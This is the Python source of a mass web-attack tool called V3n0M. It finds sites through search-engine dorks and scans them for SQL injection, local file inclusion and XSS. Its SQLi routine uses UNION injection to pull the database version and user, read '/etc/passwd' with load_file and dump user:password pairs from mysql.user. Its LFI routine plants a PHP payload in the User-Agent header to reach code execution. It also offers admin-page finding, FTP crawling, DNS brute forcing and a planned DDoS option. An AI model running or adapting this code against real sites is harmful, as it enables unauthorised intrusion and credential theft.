#!/usr/bin/python
# -*- coding: latin-1 -*-
#
#                       This program has been based upon the smartd0rk3r and darkd0rker
#                       It has been heavily edited, updated and improved upon by Novacygni
#                       but in no way is this the sole work of NovaCygni, and credit is due
#                       to every person who has worked on this tool. Thanks people. NovaCygni




# noinspection PyBroadException
try:
    import re, random, threading, socket, urllib.request, urllib.error, urllib.parse, http.cookiejar, subprocess, \
        time, sys, os, math, itertools, queue, asyncio, aiohttp, argparse, socks, httplib2, requests, codecs, dns
    from signal import SIGINT, signal
    import bs4
    from codecs import lookup, register
    from random import SystemRandom
    from socket import *
    from datetime import *


except:
    print("\n|------ PYTHON PROBLEM DETECTED! Recovery Menu Enabled -----| ")
    print("|--- You are advised to run either or both steps below   ---| ")
    print("|--- Recovery Menu is in early testing stage please let me know if you have any problems with it.   ---| ")
    print("| --Note, if your running Ubuntu you may need to run --> sudo apt-get install python3-bs4 --| ")
    print("[1] Run Pip3 and Auto-Update Python3 modules to latest versions, Requires Sudo or Root")
    print("[2] Run Pip3 and Auto-Install all the required v3n0m modules, Requires Sudo  or Root")
    print("[3] Exit")
    print(" Note: Both recovery options will at the end, perform a check at the end so everything is upto date")
    chce = input(":")
    import time
    import pip
    from subprocess import call

    if chce == '1':
        sys.stdout.flush()
        print("Warning This will force upgrade all Python3 modules")
        print("You will have 10 seconds to cancel this action before the system begins")
        print("Note: This will entirely reinstall all current installed modules aswell to clear possible problems")
        time.sleep(10)
        for dist in pip.get_installed_distributions():
            call("sudo pip3 install --upgrade --no-deps --force-reinstall " + dist.project_name, shell=True)
            call("sudo pip3 freeze --local | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 sudo pip3 install -U", shell=True)
            pass
        pass
    if chce == '2':
        sys.stdout.flush()
        print("This will install the missing modules and upgrade them to current versions then update your Python3 entirely")
        print("You will have 10 seconds to cancel this action before the system begins")
        time.sleep(10)
        call("sudo pip3 install dns --upgrade ", shell=True)
        call("sudo pip3 install aiohttp --upgrade ", shell=True)
        call("sudo pip3 install asyncio --upgrade ", shell=True)
        call("sudo pip3 install bs4 --upgrade ", shell=True)
        call("sudo pip3 install dnspython --upgrade ", shell=True)
        call("sudo pip3 install datetime --upgrade ", shell=True)
        call("sudo pip3 install requests --upgrade ", shell=True)
        call("sudo pip3 install socksipy-branch --upgrade ", shell=True)
        call("sudo pip3 freeze --local | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 sudo pip3 install -U", shell=True)
        pass
    if chce == '3':
        exit()


# Banner
def logo():
    print(R + "\n|----------------------------------------------------------------|")
    print("| Release Date 07/10/2016                                        |")
    print("|                                                                |")
    print("|        Proxy Enabled " + G + " [",ProxyEnabled,"] " + R + "                               |")
    print("|                                                                |")
    print("|                    _____       _____                           |")
    print("|          " + G + "         |____ |     |  _  |    " + R + "                      |")
    print("|             __   __   / /_ __ | |/' |_ _" + G + "_ ___             " + R + "     |")
    print("|             \ \ / /  " + G + " \ \ '" + R + "_ \|  /| | '_ ` _ \                 |")
    print("|              \ V" + G + " /.___/ / | | \ |_" + R + "/ / | | | | |                |")
    print("|    Official   \_/" + G + " \____/|_" + R + "| |_|" + G + "\___/|_| |_| " + R + "|_| Release",current_version, " \
|")
    print("|             " + B + "        NovaCygni  Architect    " + R + "                   |")
    print("|----------------------------------------------------------------|\n")


def killpid():
    print("\r\x1b[K")
    os.kill(os.getpid(), 9)


class Injthread(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)
    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    classicinj(url)
                else:
                    break
            except KeyboardInterrupt:
                pass
        self.fcount += 1
    def stop(self):
        self.check = False


class Lfithread(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)
    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    classiclfi(url)
                else:
                    break
            except KeyboardInterrupt:
                pass
        self.fcount += 1
    def stop(self):
        self.check = False


class xssthread(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)
    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    classicxss(url)
                else:
                    break
            except KeyboardInterrupt:
                pass
        self.fcount += 1
    def stop(self):
        self.check = False


# noinspection PyBroadException
def classiclfi(url):
    lfiurl = url.rsplit('=', 1)[0]
    if lfiurl[-1] != "=":
        lfiurl += "="
    for lfi in lfis:
        try:
            check = urllib.request.urlopen(lfiurl + lfi.replace("\n", "")).read()
            if re.findall(str('root:x'), check):
                print(R + "[LFI]: ", O + lfiurl + lfi, R + " ---> Local File Include Found")
                lfi_log_file.write("\n" + lfiurl + lfi)
                vuln.append(lfiurl + lfi)
                target = lfiurl + lfi
                target = target.replace("/etc/passwd", "/proc/self/environ", "/etc/passwd%00")
                header = "<? echo md5(NovaCygni); ?>"
                try:
                    request_web = urllib.request.Request(target)
                    request_web.add_header('User-Agent', header)
                    request_web.add_header = [("connection", "keep-alive"), "Cookie"]
                    text = urllib.request.urlopen(request_web)
                    text = text.read()
                    if re.findall(str('7ca328e93601c940f87d01df2bbd1972'), text):
                        print(R + "[LFI > RCE]: ", O + target, R + " ---> LFI to RCE Found")
                        rce_log_file.write('target\n')
                        vuln.append(target)
                except:
                    pass

        except:
            pass


# noinspection PyBroadException
def classicxss(url):
    for xss in xsses:
        if url not in vuln:
            try:
                source = urllib.request.urlopen(url + xss.replace("\n", "")).read()
                if not (not re.findall(str("<OY1Py"), source) and not re.findall(str("<LOY2PyTRurb1c"), source)):
                    print(R + "\r\x1b[K[XSS]: ", O + url + xss, R + " ---> XSS Found")
                    xss_log_file.write("\n" + url + xss)
                    vuln.append(url)
            except:
                if len(xss + url) < 147:
                    sys.stdout.write(
                        B + "\r\x1b[K [*] Testing %s%s" % (
                            url, xss))
                    sys.stdout.flush()


# noinspection PyBroadException
def lfitest():
    print(B + "\n[+] Preparing for LFI - RCE scanning ...")
    print("[+] Can take a while ...")
    print("[!] Working ...\n")
    vb = len(usearch) / int(numthreads)
    i = int(vb)
    m = len(usearch) % int(numthreads)
    z = 0
    if len(threads) <= int(numthreads):
        for x in range(0, int(numthreads)):
            sliced = usearch[x * i:(x + 1) * i]
            if z < m:
                sliced.append(usearch[int(numthreads) * i + z])
                z += 1
            thread = Lfithread(sliced)
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()


# noinspection PyBroadException
def xsstest():
    print(B + "\n[+] Preparing for XSS scanning ...")
    print("[+] Can take a while ...")
    print("[!] Working ...\n")
    vb = len(usearch) / int(numthreads)
    i = int(vb)
    m = len(usearch) % int(numthreads)
    z = 0
    if len(threads) <= int(numthreads):
        for x in range(0, int(numthreads)):
            sliced = usearch[x * i:(x + 1) * i]
            if z < m:
                sliced.append(usearch[int(numthreads) * i + z])
                z += 1
            thread = xssthread(sliced)
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()


# Apoligies for this ugly section of code
# It is just a placeholder
# So dont worry, itll be replaced soon enough
# noinspection PyBroadException
def classicinj(url):
    aug_url = url + "'"
    try:
        resp = urllib.request.urlopen(aug_url)
        cctvcheck = urllib.request.urlopen(url)
        hits = str(resp.read())
        if str("error in your SQL syntax") in hits:
            print(url + " is vulnerable --> MySQL Classic")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("mysql_fetch") in hits:
            print(url + " is Vulnerable --> MiscError")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("num_rows") in hits:
            print(url + " is Vulnerable --> MiscError2")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("ORA-01756") in hits:
            print(url + " is Vulnerable --> Oracle")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("Error Executing Database Query") in hits:
            print(url + " is Vulnerable --> JDBC_CFM")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("SQLServer JDBC Driver") in hits:
            print(url + " is Vulnerable --> JDBC_CFM2")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("OLE DB Provider for SQL Server") in hits:
            print(url + " is Vulnerable --> MSSQL_OLEdb")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("Unclosed quotation mark") in hits:
            print(url + " is Vulnerabe --> MSSQL_Uqm")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("ODBC Microsoft Access Driver") in hits:
            print(url + " is Vulnerable --> MS-Access_ODBC")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("Microsoft JET Database") in hits:
            print(url + " is Vulnerable --> MS-Access_JETdb")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("Error Occurred While Processing Request") in hits:
            print(url + " is Vulnerable --> Processing Request")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("Microsoft JET Database") in hits:
            print(url + " is Vulnerable --> MS-Access JetDb")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("Error Occurred While Processing Request") in hits:
            print(url + " is Vulnerable --> Processing Request ")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("Server Error") in hits:
            print(url + " is Vulnerable --> Server Error")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("ODBC Drivers error") in hits:
            print(url + " is Vulnerable --> ODBC Drivers error")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("Invalid Querystring") in hits:
            print(url + " is Vulnerable --> Invalid Querystring")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("OLE DB Provider for ODBC") in hits:
            print(url + " is Vulnerable --> OLE DB Provider for ODBC")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("VBScript Runtime") in hits:
            print(url + " is Vulnerable --> VBScript Runtime")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("ADODB.Field") in hits:
            print(url + " is Vulnerable --> ADODB.Field")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("BOF or EOF") in hits:
            print(url + " is Vulnerable --> BOF or EOF")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("ADODB.Command") in hits:
            print(url + " is Vulnerable --> ADODB.Command")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("JET Database") in hits:
            print(url + " is Vulnerable --> JET Database")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("mysql_fetch_array") in hits:
            print(url + " is Vulnerabe --> mysql_fetch_array")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("Syntax error") in hits:
            print(url + " is Vulnerable --> Syntax error")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("mysql_numrows()") in hits:
            print(url + " is Vulnerable --> mysql_numrows()")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("GetArray()") in hits:
            print(url + " is Vulnerable --> GetArray()")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("FetchRow()") in hits:
            print(url + " is Vulnerable --> FetchRow()")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        elif str("Input string was not in a correct format") in hits:
            print(url + " is Vulnerable --> Input String Error")
            logfile.write("\n" + aug_url)
            vuln.append(hits)
            col.append(hits)
            pass
        else:
            pass
    except:
        pass


# noinspection PyBroadException
def life_pulse():
    global life
    pulse_1 = datetime.now()
    life = pulse_1 - pulse
    print(life)


# noinspection PyBroadException
def injtest():
    global logfile
    global pulse
    pulse = datetime.now()
    log = "v3n0m-sqli.txt"
    logfile = open(log, "a")
    print(B + "\n[+] Preparing for SQLi scanning ...")
    print("[+] Can take a while and appear not to be doing anything...")
    print("[!] Please be patient if you can see this message, its Working ...\n")
    vb = len(usearch) / int(numthreads)
    i = int(vb)
    m = len(usearch) % int(numthreads)
    z = 0
    try:
        if len(threads) <= int(numthreads):
            for x in range(0, int(numthreads)):
                sliced = usearch[x * i:(x + 1) * i]
                if z < m:
                    sliced.append(usearch[int(numthreads) * i + z])
                    z += 1
                thread = Injthread(sliced)
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()
    except TimeoutError:
        pass


# noinspection PyBroadException
def colfinder():
    print(B + "\n[+] Preparing for Column Finder ...")
    print("[+] Can take a while ...")
    print("[!] Working ...")
    for host in col:
        print(R + "\n[+] Target: ", O + host)
        print(R + "[+] Attempting to find the number of columns ...")
        print("[+] Testing: ", end=' ')
        checkfor = []
        host = host.rsplit("'", 1)[0]
        sitenew = host + arg_eva + "and" + arg_eva + "1=2" + arg_eva + "union" + arg_eva + "all" + arg_eva + "select" + arg_eva
        makepretty = ""
        for x in range(0, colMax):
            darkc0de = "dark" + str(x) + "c0de"
            try:
                sys.stdout.write("%s," % x)
                sys.stdout.flush()
                checkfor.append(darkc0de)
                if x > 0:
                    sitenew += ","
                sitenew += "0x" + str(darkc0de.encode("hex"))
                finalurl = sitenew + arg_end
                source = urllib.request.urlopen(finalurl).read()
                for y in checkfor:
                    colFound = re.findall(y, source)
                    if len(colFound) >= 1:
                        print("\n[+] Column length is:", len(checkfor))
                        nullcol = re.findall(str("\d+"), y)
                        print("[+] Found null column at column #:", nullcol[0])
                        for z in range(0, len(checkfor)):
                            if z > 0:
                                makepretty += ","
                            makepretty += str(z)
                        site = host + arg_eva + "and" + arg_eva + "1=2" + arg_eva + "union" + arg_eva + "all" + arg_eva + "select" + arg_eva + makepretty
                        print("[+] SQLi URL:", site + arg_end)
                        site = site.replace("," + nullcol[0] + ",", ",darkc0de,")
                        site = site.replace(arg_eva + nullcol[0] + ",", arg_eva + "darkc0de,")
                        site = site.replace("," + nullcol[0], ",darkc0de")
                        print("[+] darkc0de URL:", site)
                        darkurl.append(site)

                        print("[-] Done!\n")
                        break

            except(KeyboardInterrupt, SystemExit):
                raise
            except:
                pass

        print("\n[!] Sorry column length could not be found\n")
    print(B + "\n[+] Gathering MySQL Server Configuration...")
    for site in darkurl:
        head_url = site.replace("2600",
                                "concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)") + arg_end
        print(R + "\n[+] Target:", O + site)
        while 1:
            try:
                source = urllib.request.urlopen(head_url).read()
                match = re.findall(str("\x1e\x1e\S+"), source)
                if len(match) >= 1:
                    match = match[0][2:].split("\x1e")
                    version = match[0]
                    user = match[1]
                    database = match[2]
                    print(W + "\n\tDatabase:", database)
                    print("\tUser:", user)
                    print("\tVersion:", version)
                    load = site.replace("2600", "load_file(0x2f6574632f706173737764)")
                    source = urllib.request.urlopen(load).read()
                    if re.findall(str("root:x"), source):
                        load = site.replace("2600", "concat_ws(char(58),load_file(0x" + str(file.encode(
                            "hex")) + "),0x62616c74617a6172)")
                        source = urllib.request.urlopen(load).read()
                        search = re.findall(str("NovaCygni"), source)
                        if len(search) > 0:
                            print("\n[!] w00t!w00t!: " + site.replace("2600",
                                                                      "load_file(0x" + str(file.encode("hex")) + ")"))
                        load = site.replace("2600",
                                            "concat_ws(char(58),user,password,0x62616c74617a6172)") + arg_eva + "from" + arg_eva + "mysql.user"
                    source = urllib.request.urlopen(load).read()
                    if re.findall(str("NovaCygni"), source):
                        print("\n[!] w00t!w00t!: " + site.replace("2600",
                                                                  "concat_ws(char(58),user,password)") + arg_eva + "from" + arg_eva + "mysql.user")
                print(W + "\n[+] Number of tables:", len(tables))
                print("[+] Number of columns:", len(columns))
                print("[+] Checking for tables and columns...")
                target = site.replace("2600", "0x62616c74617a6172") + arg_eva + "from" + arg_eva + "T"
                for table in tables:
                    try:
                        target_table = target.replace("T", table)
                        source = urllib.request.urlopen(target_table).read()
                        search = re.findall(str("NovaCygni"), source)
                        if len(search) > 0:
                            print("\n[!] Table found: < " + table + " >")
                            print("\n[+] Lets check for columns inside table < " + table + " >")
                            for column in columns:
                                try:
                                    source = urllib.request.urlopen(target_table.replace("0x62616c74617a6172",
                                                                                         "concat_ws(char(58),0x62616c74617a6172," + column + ")")).read()
                                    search = re.findall(str("NovaCygni"), source)
                                    if len(search) > 0:
                                        print("\t[!] Column found: < " + column + " >")
                                except(KeyboardInterrupt, SystemExit):
                                    raise
                                except(urllib.error.URLError, socket.gaierror, socket.error, socket.timeout):
                                    pass

                            print("\n[-] Done searching inside table < " + table + " > for columns!")

                    except(KeyboardInterrupt, SystemExit):
                        raise
                    except(urllib.error.URLError, socket.gaierror, socket.error, socket.timeout):
                        pass
                print("[!] Fuzzing is finished!")
                break
            except(KeyboardInterrupt, SystemExit):
                raise


# noinspection PyBroadException,PyGlobalUndefined
def fscan():
    global pages_pulled_as_one
    global usearch
    global numthreads
    global threads
    global finallist
    global finallist2
    global col
    global darkurl
    global sitearray
    global loaded_Dorks
    threads = []
    finallist = []
    finallist2 = []
    col = []
    darkurl = []
    loaded_Dorks = []
    print(W)
    sites = input("\nChoose your target(domain) ie .com , to attempt to force the domain restriction use *, ie *.com : ")
    sitearray = [sites]
    dorks = input("Choose the number of random dorks (0 for all.. may take awhile!)   : ")
    print("")
    if int(dorks) == 0:
        i = 0
        while i < len(d0rk):
            loaded_Dorks.append(d0rk[i])
            i += 1
    else:
        i = 0
        while i < int(dorks):
            loaded_Dorks.append(d0rk[i])
            i += 1
    numthreads = input('\nEnter no. of threads, Between 50 and 500: ')
    pages_pulled_as_one = input('Enter no. of Search Engine Pages to be scanned per d0rk,  \n'
                                ' Between 20 and 100, increments of 20. Ie> 20:40:60:80:100   : ')
    print("\nNumber of SQL errors :", "26")
    print("LFI payloads    :", len(lfis))
    print("XSS payloads    :", len(xsses))
    print("Headers         :", len(header))
    print("Threads         :", numthreads)
    print("Dorks           :", len(loaded_Dorks))
    print("Pages           :", pages_pulled_as_one)
    print("Timeout         :", timeout)
    loop = asyncio.get_event_loop()
    usearch = loop.run_until_complete(search(pages_pulled_as_one))
    vulnscan()


def cloud():
    try:
        logo()
        target_site = input("Enter the site eg target.com: \n")
        print(B)
        pwd = os.path.dirname(str(os.path.realpath(__file__)))
        cloud = subprocess.Popen('python ' + pwd + "/modules/buster.py -m" + str(target_site), shell=True)
        cloud.communicate()
        subprocess._cleanup()
        fmenu()
    except Exception:
        print(Exception)


def det_Neph():
    print("")


def det_Honeyd():
    print("")


def det_Kippo():
    print("")


# noinspection PyBroadException
def vulnscan():
    global endsub
    global lfi_log_file
    global rce_log_file
    global xss_log_file
    global vuln
    lfi_log_file = open("v3n0m-lfi.txt", "a")
    rce_log_file = open("v3n0m-rce.txt", "a")
    xss_log_file = open("v3n0m-xss.txt", "a")
    endsub = 0
    print(R + "\n[1] SQLi Testing")
    print("[2] SQLi Testing Auto Mode")
    print("[3] LFI - RCE Testing")
    print("[4] XSS Testing")
    print("[5] Save valid urls to file")
    print("[6] Print valid urls")
    print("[7] Print Found vuln in last scan")
    print("[8] Back to main menu")
    chce = input(":")
    if chce == '1':
        vuln = []
        injtest()
        print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(col)) + B + " vuln sites found.")
        print()
    elif chce == '2':
        vuln = []
        injtest()
        colfinder()
        endsub = 0
        print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found.")
        print()
    elif chce == '3':
        vuln = []
        lfitest()
        endsub = 0
        print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found.")
        print()
    elif chce == '4':
        vuln = []
        xsstest()
        print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found.")
        print()
        endsub = 0
    elif chce == '5':
        print(B + "\nSaving valid urls (" + str(len(finallist)) + ") to file")
        listname = input("Filename: ")
        list_name = open(listname, "w")
        finallist.sort()
        for t in finallist:
            list_name.write(t + "\n")
        list_name.close()
        print("Urls saved, please check", listname)
        endsub = 0
    elif chce == '6':
        print(W + "\nPrinting valid urls:\n")
        finallist.sort()
        for t in finallist:
            print(B + t)
        endsub = 0
    elif chce == '7':
        print(B + "\nVuln found ", len(vuln))
        print(vuln)
        endsub = 0
    elif chce == '8':
        endsub = 1
        fmenu()
    else:
        fmenu()


holder_ips = ["192.168.0.{}".format(i) for i in range(1, 255)]
holder_ports = ["{}".format(i) for i in range(1, 36500)]
ips = [holder_ips]
ports = [holder_ports]


def tcp_Scanner_run(tasks, *, loop=None):
    if loop is None:
        loop = asyncio.get_event_loop()
    return loop.run_until_complete(asyncio.wait(tasks))


# noinspection PyBroadException
async def tcp_scanner(ip, port, loop=None):
    fut = asyncio.open_connection(ip, port, loop=loop)
    try:
        await asyncio.wait_for(fut, timeout=0.5)
        print("{}:{} Connected".format(ip, port))
    except asyncio.TimeoutError:
        pass
    except Exception as exc:
        print('Error {}:{} {}'.format(ip, port, exc))


# noinspection PyBroadException
def tcp_scan(ips, ports, randomize=True):
    loop = asyncio.get_event_loop()
    if randomize:
        rdev = SystemRandom()
        ips = rdev.shuffle(ips)
        ports = rdev.shuffle(ports)

    tcp_Scanner_run(tcp_scanner(ip, port) for port in ports for ip in ips)


# noinspection PyBroadException
def ignoringGet(url):
    try:
        try:
            responce = requests.get(url)
            responce.raise_for_status()
        except Exception:
            return ''
        return responce.text
    except KeyboardInterrupt:
        os.system('clear')
        chce1 = input(':')
        logo()
        print(G + "Program Paused" + R)
        print("[1] Unpause")
        print("[2] Skip rest of scan and Continue with current results")
        print("[3] Return to main menu")
        if chce1 == "1":
            return
        if chce1 == "2":
            vulnscan()
        if chce1 == "3":
            fmenu()
        else:
            pass


def CreateTempFolder(self):
    from tempfile import mkdtemp
    self.temp = mkdtemp(prefix='v3n0m')
    if not self.temp.endswith(os.sep):
        self.temp += os.sep


def upgrade():
    import time
    global page
    global revision
    try:
        print(R + ' [+]' + W + ' checking for latest version...')
        try:
            sock = ignoringGet(
                'https://raw.githubusercontent.com/v3n0m-Scanner/V3n0M-Scanner/master/src/v3n0m.py')
            page = sock
            try:
                if str("Release 411" or "Release 412" or "Release 413" or
                       "Release 44" or "Release 45" or "Release 46" or "Release 47" or "Release 48" or "Release 49"
                       or "Release 5" or "Release 6" or "Release 7" or "Release 8" or "Release 9") in page:
                    revision = int(410)
                else:
                    revision = current_version
                    print( R + ' [!]' + W + ' Current version is either Latest or No Update was detected')
                    time.sleep(4)
                    pass
            except KeyboardInterrupt:
                pass
        except KeyboardInterrupt:
            pass
        if revision >= current_version:
            print(R+ " [!] [Program Debug Info] I did revision as", G + str(revision), R + "and current version as",
                 G + str(current_version))
            print(R + ' [!]' + W + ' a new version is ' + G + 'available!' + W)
            print(R + ' [-]' + W + '   revision:    ' + G + str(revision), 'or Higher Available' + W)
            response = input(R + ' [+]' + W + ' do you want to upgrade to the latest version? (y/n): ')
            if not response.lower().startswith('y'):
                print(R + ' [-]' + W + ' upgrading ' + O + 'aborted' + W)
                fmenu()
                return
            print(R + ' [+] ' + G + 'downloading' + W + ' update...')
            try:
                sock = urllib.request.urlopen(
                    'https://raw.githubusercontent.com/v3n0m-Scanner/V3n0M-Scanner/master/src/v3n0m.py')
                page = sock.read()
            except IOError:
                page = ''
            if page == '':
                print(R + ' [+] ' + O + 'unable to download latest version' + W)
            f = open('v3n0m_new.py', 'w')
            f.write(page)
            f.close()
            this_file = __file__
            if this_file.startswith('./'):
                this_file = this_file[2:]
            f = open('update_v3n0m.sh', 'w')
            f.write('''#!/bin/sh\n
                           rm -rf ''' + this_file + '''\n
                           mv v3n0m_new.py ''' + this_file + '''\n
                           rm -rf update_v3n0m.sh\n
                           chmod +x ''' + this_file + '''\n
                          ''')
            f.close()
            returncode = call(['chmod', '+x', 'update_v3n0m.sh'])
            if returncode != 0:
                print(R + ' [!]' + O + ' permission change returned unexpected code: ' + str(returncode) + W)
                fmenu()
            # Run the script
            returncode = call(['sh', 'update_v3n0m.sh'])
            if returncode != 0:
                print(R + ' [!]' + O + ' upgrade script returned unexpected code: ' + str(returncode) + W)
                fmenu()
            print(R + ' [+] ' + G + 'updated!' + W + ' type "./' + this_file + '" to run again')
        else:
            pass
    except Exception:
        print(R + '\n (^C)' + O + str(Exception) + W)
    fmenu()


# noinspection PyBroadException
async def search(pages_pulled_as_one):
    urls = []
    urls_len_last = 0
    timestart = datetime.now()
    for site in sitearray:
        dark = 0
        for dork in loaded_Dorks:
            dark += 1
            page = 0
            while page < int(pages_pulled_as_one):
                query = dork + "+site:"
                futures = []
                loop = asyncio.get_event_loop()
                for i in range(20):
                    results_web = "http://www.bing.com/search?q=" + query + "&go=Submit&first=" + str(
                        (page + i) * 50 + 1) + "&count=50"
                    futures.append(loop.run_in_executor(None, ignoringGet, results_web))
                page += 20
                stringreg = re.compile('(?<=href=")(.*?)(?=")')
                names = []
                for future in futures:
                    result = await future
                    names.extend(stringreg.findall(result))
                domains = set()
                for name in names:
                    basename = re.search(r"(?<=(://))[^/]*(?=/)", name)
                    if (basename is None) or any([x.strip() in name for x in search_Ignore.splitlines(keepends=True)]):
                        basename = re.search(r"(?<=://).*", name)
                    if basename is not None:
                        basename = basename.group(0)
                    if basename not in domains and basename is not None:
                        domains.add(basename)
                        urls.append(name)
                darklen = len(loaded_Dorks)
                percent = int((1.0 * dark / int(darklen)) * 100)
                urls_len = len(urls)
                os.system('clear')
                start_time = datetime.now()
                timeduration = start_time - timestart
                ticktock = timeduration.seconds
                hours, remainder = divmod(ticktock, 3600)
                minutes, seconds = divmod(remainder, 60)
                sys.stdout.flush()
                logo()
                sys.stdout.write(W +
                                 "\r\x1b[K " + R + "| Domain: <%s> Has been targeted \n "
                                                  "| Collected urls: %s Since start of scan \n"
                                                   " | D0rks: %s/%s Progressed so far \n"
                                                   " | Percent Done: %s \n"
                                                   " | Current page no.: <%s> in Cycles of 20 Page results pulled in Asyncio\n"
                                                   " | Dork In Progress: %s\n"
                                                   " | Elapsed Time: %s\n" % (R +
                                                                              site, repr(urls_len), dark, darklen,
                                                                              repr(percent), repr(page), dork,
                                                                              '%s:%s:%s' % (hours, minutes, seconds)))
                sys.stdout.flush()
                if urls_len == urls_len_last:
                    page = int(pages_pulled_as_one)
                urls_len_last = urls_len
    tmplist = []
    print("\n\n[+] URLS (unsorted) : Contains all the trash results still including duplicates: ", len(urls))
    for url in urls:
        try:
            host = url.split("/", 3)
            domain = host[2]
            if domain not in tmplist and "=" in url:
                finallist.append(url)
                tmplist.append(domain)
        except KeyboardInterrupt:
            os.system('clear')
            chce1 = input(':')
            logo()
            print(G + "Program Paused" + R)
            print("[1] Unpause")
            print("[2] Skip rest of scan and Continue with current results")
            print("[3] Return to main menu")
            if chce1 == "1":
                return
            if chce1 == "2":
                vulnscan()
            if chce1 == "3":
                fmenu()
            else:
                pass
            continue
    print("[+] URLS (sorted)  : Trash, Duplicates, Dead-Links and other rubbish removed ", len(finallist))
    return finallist


# noinspection PyBroadException
def fmenu():
    global vuln
    vuln = []
    if endsub != 1:
        vulnscan()
    logo()
    print("[1] Dork and vuln scan")
    print("[2] Admin page finder")
    print("[3] FTP crawler and vuln scan")
    print("[4] DNS brute")
    print("[5] Enable Tor/Proxy Support")
    print("[6] Misc Options")
    print("[7] Check for and apply update")
    print("[0] Exit\n")
    chce = input(":")

    if chce == '1':
        print(W + "")
        fscan()

    elif chce == '2':
        afsite = input("Enter the site eg target.com: ")
        print(B)
        pwd = os.path.dirname(str(os.path.realpath(__file__)))
        findadmin = subprocess.Popen(pwd + "/modules/adminfinder.py -w modules/adminlist.txt -u " + str(afsite),
                                     shell=True)
        findadmin.communicate()
        subprocess._cleanup()

    elif chce == '3':
        randips = input("How many IP addresses do you want to scan: ")
        print(B)
        pwd = os.path.dirname(str(os.path.realpath(__file__)))
        ftpcrawl = subprocess.Popen(pwd + "/modules/ftpcrawler.py -i " + str(randips), shell=True)
        ftpcrawl.communicate()
        subprocess._cleanup()

    elif chce == '4':
        target_site = input("Enter the site eg target.com: ")
        print(B)
        pwd = os.path.dirname(str(os.path.realpath(__file__)))
        dnsbrute = subprocess.Popen(pwd + "/modules/dnsbrute.py -w modules/subdomainsmid.txt -u " + str(target_site),
                                    shell=True)
        dnsbrute.communicate()
        subprocess._cleanup()

    elif chce == '5':
        print(W + "")
        enable_proxy()

    elif chce == '0':
        print(R + "\n Exiting ...")
        print(W)
        sys.exit(0)

    elif chce == '6':
        print(W + "")
        os.system('clear')
        logo()
        print("[1] Skip to custom SQLi list checking")
        print("[2] Cloudflare IP Resolver #Not Ready#")
        print("[3] SockStress DDoS Tool #Not Ready#")
        print("[0] Return to main menu")
        chce2 = input(":")
        if chce2 == '1':
            os.system('clear')
            logo()
            try:
                temp = input("Please Input Custom List Path \n"
                                                           "ie> \n"
                                                           "/home/user/Desktop/samples.txt \n")
                url = [line.strip() for line in open(temp, 'r')]
                classicinj(url)
            except FileNotFoundError:
                print("Target file not found!")
                fmenu()
        elif chce2 == '2':
            cloud()
            fmenu()
        elif chce2 == '0':
            fmenu()


    elif chce == '7':
        upgrade()


signal(SIGINT, killpid)
d0rk = [line.strip() for line in open("statics/d0rks", 'r', encoding='utf-8')]
header = [line.strip() for line in open("statics/header", 'r')]
xsses = [line.strip() for line in open("statics/xsses", 'r')]
